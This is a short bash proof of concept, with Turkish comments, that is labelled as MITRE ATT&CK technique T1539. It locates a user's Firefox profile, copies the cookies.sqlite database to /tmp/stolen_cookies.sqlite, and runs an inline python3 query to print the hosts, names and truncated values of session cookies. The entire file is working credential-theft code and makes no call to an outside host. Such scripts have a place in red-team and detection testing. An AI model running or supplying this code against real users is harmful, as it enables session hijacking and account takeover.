#!/bin/bash
#T1539 - Web Session Cookie Collection PoC (Linux/Firefox)

echo "Firefox cookie veritabanlari araniyor..."

PROFILE_DIR=$(find ~/.mozilla/firefox -maxdepth 1 -name "*.default*" -type d | head -n 1)
STAGING_DB="/tmp/stolen_cookies.sqlite"

if [ -n "$PROFILE_DIR" ]; then
    cp "$PROFILE_DIR/cookies.sqlite" "$STAGING_DB" 2>/dev/null
    echo "Cookie veritabani kopyalandi: $STAGING_DB"
    echo -e "\n[ELE GECIRILEN COOKIE KAYITLARI]"
    
    #LotL Teknigi: Python3 ile SQLite sorgusu
    python3 -c "
import sqlite3
try:
    conn = sqlite3.connect('$STAGING_DB')
    cursor = conn.cursor()
    cursor.execute('SELECT host, name, value FROM moz_cookies WHERE length(value) > 15 LIMIT 5;')
    for row in cursor.fetchall():
        print(f' -> Host: {row[0]:<20} | Cookie: {row[1]:<15} | Deger: {row[2][:25]}...')
    conn.close()
except:
    pass
"
fi